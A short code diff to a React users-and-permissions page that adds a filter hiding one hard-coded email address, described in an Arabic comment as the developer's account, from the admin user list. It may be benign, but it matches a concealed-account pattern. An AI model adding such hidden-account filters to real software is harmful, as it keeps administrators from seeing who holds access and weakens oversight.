@@ -145,7 +145,12 @@ export default function UsersPermissionsPage() {
 
   const filteredUsers = useMemo(() => {
     if (!users) return [];
-    let list = users.filter(u => u.status !== 'deleted');
+    
+    // إخفاء حساب المطور وحسابات الأرشفة تماماً من القائمة
+    let list = users.filter(u => 
+      u.status !== 'deleted' && 
+      u.email !== 'alqaysarpc219@gmail.com'
+    );
     
     // Search Filter
     if (search) {
